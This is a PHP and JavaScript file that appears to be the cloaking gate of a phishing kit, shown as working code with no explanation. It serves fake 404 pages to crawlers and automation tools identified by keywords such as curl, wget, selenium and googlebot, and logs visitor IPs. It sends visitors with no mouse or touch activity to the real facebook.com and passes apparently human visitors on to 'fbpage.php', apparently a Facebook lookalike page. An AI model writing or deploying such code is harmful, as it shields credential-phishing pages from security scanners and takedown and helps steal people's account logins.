<?php
$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? '';
$ip = $_SERVER['REMOTE_ADDR'] ?? 'unknown';

$bot_keywords = ['bot', 'crawl', 'spider', 'scraper', 'curl', 'wget', 
                 'python', 'java', 'httpclient', 'headless', 'puppeteer', 
                 'selenium', 'phantom', 'googlebot', 'bingbot', 'slurp',
                 'facebookexternalhit', 'linkedinbot', 'twitterbot'];

$is_bot = false;
foreach ($bot_keywords as $keyword) {
    if (stripos($user_agent, $keyword) !== false) {
        $is_bot = true;
        break;
    }
}

$log = date('Y-m-d H:i:s') . " | IP: $ip | UA: $user_agent | Bot: " . ($is_bot ? 'YES' : 'NO') . PHP_EOL;
file_put_contents('visits.log', $log, FILE_APPEND);

if ($is_bot) {
    http_response_code(404);
    echo '<!DOCTYPE html>
    <html>
    <head><title>404 Page Not Found</title></head>
    <body>
    <h1>404 - Page Not Found</h1>
    <p>The requested page could not be found.</p>
    </body>
    </html>';
    exit;
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title></title>
</head>
<body>

<script>
    const pageLoadTime = Date.now();
    
    let mouseMoved = false;
    document.addEventListener('mousemove', function() {
        mouseMoved = true;
    });
    document.addEventListener('touchstart', function() {
        mouseMoved = true;
    });
    
    setTimeout(function() {
        if (!mouseMoved) {
            window.location.href = 'https://www.facebook.com';
            return;
        }
        
        const token = Date.now() + '_' + Math.random().toString(36).substr(2, 16);
        window.location.href = 'fbpage.php?token=' + token + '&verify=' + pageLoadTime;
    }, 2000);
</script>

<noscript>
    <meta http-equiv="refresh" content="0; url=https://www.facebook.com">
</noscript>

</body>
</html>
